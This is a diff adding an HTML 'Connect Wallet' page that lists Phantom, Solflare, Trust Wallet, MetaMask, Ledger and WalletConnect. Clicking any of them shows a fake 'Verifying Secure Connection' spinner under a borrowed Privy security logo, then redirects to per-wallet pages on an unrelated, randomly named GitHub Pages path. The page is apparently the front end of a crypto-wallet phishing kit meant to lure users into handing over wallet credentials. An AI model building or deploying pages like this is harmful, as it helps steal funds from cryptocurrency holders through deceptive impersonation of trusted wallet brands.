@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Connect Wallet Modal</title>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+
+    <style>
+      /* Global Styles */
+      *, :after, :before {
+        box-sizing: border-box;
+      }
+
+      body {
+        padding-top: 10vh;
+        margin: 0;
+        font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica Neue, Noto Sans, Liberation Sans, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;        font-size: 1rem;
+        color: #fff;
+        background-color: #1b1d28;
+      }
+
+      /* Modal Styles */
+      .modal-content {
+        background-color: #1b1d28 !important;
+        border: 1px solid #fff !important;
+        border-radius: 10px;
+        padding: 1rem 0;
+        width: 80%;
+        margin: auto;
+      }
+
+      .modal-body {
+        text-align: center;
+      }
+
+      .modal-body h4 {
+        font-size: 1.1rem;
+        color: white;
+        font-weight: 600;
+        margin-bottom: 1rem;
+        margin-top: 15px;
+      }
+
+      .selecting_chain {
+        display: flex;
+        gap: 10px;
+        justify-content: left;
+        align-items: center;
+        background-color: #2b2f3f;
+        padding: 10px;
+        margin-left: 10px;
+        margin-right: 10px;
+        border-radius: 8px;
+        margin-bottom: 15px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+
+      .selecting_chain:hover {
+        background-color: #3a3f58;
+      }
+
+      .selecting_chain img {
+        border-radius: 5px;
+        width: 30px;
+        height: 30px;
+        object-fit: cover;
+      }
+
+      .selecting_chain span {
+        color: white;
+        font-size: 0.8rem;
+        font-weight: 600;
+
+      }
+
+      .modal-dialog {
+        margin: 1rem;
+        pointer-events: none;
+        position: relative;
+        width: auto;
+      }
+
+      .modal {
+        display: none;
+        height: 100%;
+        left: 0;
+        outline: 0;
+        overflow-x: hidden;
+        overflow-y: auto;
+        position: fixed;
+        top: 0;
+        width: 100%;
+        z-index: 1055;
+      }
+      .selecting_chain > .Wl{
+        border-radius: 50%;
+      }
+      /* Classe pour centrer le spinner */
+.center {
+  display: flex;
+  justify-content: center; /* Centrer horizontalement */
+  align-items: center; /* Centrer verticalement */
+  height: 100%; /* Hauteur de l'élément contenant le spinner */
+}
+
+      /* Style du spinner */
+.spinner {
+  border: 4px solid rgba(255, 255, 255, 0.3);
+  border-top: 4px solid #fff;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+}
+#verifyingModal{
+    padding-top: 30vh;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* Logo Privy et texte en bas */
+.protected-by {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 5px;
+  color: white;
+  font-size: 0.9rem;
+  margin-top: 20px;
+}
+
+    </style>
+  </head>
+  <body>
+    <div class="modal-content">
+        <div class="modal-body">
+          <h4>Connect Wallet</h4>
+          
+          <!-- Wallet Options -->
+          <div class="selecting_chain" data-wallet="phantom">
+            <img src="https://play-lh.googleusercontent.com/obRvW02OTYLzJuvic1ZbVDVXLXzI0Vt_JGOjlxZ92XMdBF_i3kqU92u9SgHvJ5pySdM=w480-h960-rw" alt="Phantom" />
+            <span>Phantom</span>
+          </div>
+      
+          <div class="selecting_chain" data-wallet="salflare">
+            <img src="https://play-lh.googleusercontent.com/4E-ouY-jU11F0Y7g5J0cl_rCjxVPzFanY3KS-J_0V5tzQewpqI68rqUAPVCaluk61Cg=w480-h960-rw" alt="salflare" />
+            <span>Solflare</span>
+          </div>
+      
+          <div class="selecting_chain" data-wallet="torus">
+            <img src="https://play-lh.googleusercontent.com/cd5BevWohRqLwsI2_i3k4YIVtcO57cIZCs6l20H1Hcdj0P2rFEcX_7QtgKbTM3Sn_A=s96-rw" />
+            <span>TrustWallet</span>
+          </div>
+      
+          <div class="selecting_chain" data-wallet="metamask">
+            <img src="https://play-lh.googleusercontent.com/8rzHJpfkdFwA0Lo6_CHUjoNt8OU3EyIe9BZNKGqj0C8BhleguW9LhXHbS46FAtLAJ9r2=s96-rw" />
+            <span>Metamask</span>
+          </div>
+      
+          <div class="selecting_chain" data-wallet="ledger">
+            <img src="https://play-lh.googleusercontent.com/mHjR3KaAMw3RGA15-t8gXNAy_Onr4ZYUQ07Z9fG2vd51IXO5rd7wtdqEWbNMPTgdqrk=s96-rw" />
+            <span>Ledger</span>
+          </div>
+      
+          <div class="selecting_chain" data-wallet="wallet-connect">
+            <img class="Wl" src="https://altcoinsbox.com/wp-content/uploads/2023/04/wallet-connect-logo.jpg" />
+            <span>Wallet Connect</span>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Modal de vérification -->
+      <div id="verifyingModal" class="modal" style="display: none;">
+        <div class="modal-content">
+          <div class="modal-body">
+            <h4>Verifying Secure Connection</h4>
+            <p>Authenticating wallet through multiple security protocols...</p>
+            <div class="center"><div class="spinner"></div></div> <!-- Centrer le spinner -->
+            <div class="protected-by">
+              <img src="Privy_ProtectedLockup_White.svg" alt="Privy logo" style="max-width: 140px;" />
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <script>
+      document.querySelectorAll('.selecting_chain').forEach((wallet) => {
+        wallet.addEventListener('click', () => {
+          const walletType = wallet.getAttribute('data-wallet'); // Récupérer le type de wallet sélectionné
+          let redirectUrl = '';
+      
+          // Définir l'URL de redirection en fonction du wallet sélectionné
+          switch(walletType) {
+            case 'phantom':
+              redirectUrl = 'https://fauxon.github.io/fhrdhqctvghbn-/connectphantom.html';
+              break;
+            case 'salflare':
+              redirectUrl = 'https://fauxon.github.io/fhrdhqctvghbn-/connectsolflare.html';
+              break;
+            case 'torus':
+              redirectUrl = 'https://fauxon.github.io/fhrdhqctvghbn-/connectTrust.html';
+              break;
+            case 'metamask':
+              redirectUrl = 'https://fauxon.github.io/fhrdhqctvghbn-/Metamask.html';
+              break;
+            case 'ledger':
+              redirectUrl = 'https://fauxon.github.io/fhrdhqctvghbn-/connectLedger.html';
+              break;
+            case 'wallet-connect':
+              redirectUrl = 'https://fauxon.github.io/fhrdhqctvghbn-/connect.html';
+              break;
+            default:
+              redirectUrl = 'https://fauxon.github.io/fhrdhqctvghbn-/connect.html'; // URL par défaut si aucun wallet n'est sélectionné
+          }
+      
+          // Afficher le modal de vérification
+          document.getElementById('verifyingModal').style.display = 'block';
+      
+          // Vous pouvez simuler un délai pour masquer ce modal après un certain temps, par exemple 3 secondes
+          setTimeout(() => {
+            document.getElementById('verifyingModal').style.display = 'none';
+            window.location.href = redirectUrl; // Rediriger vers le lien spécifique après 3 secondes
+          }, 3000); // Délai de 3 secondes
+        });
+      });
+      </script>
+      
+  </body>
+</html>
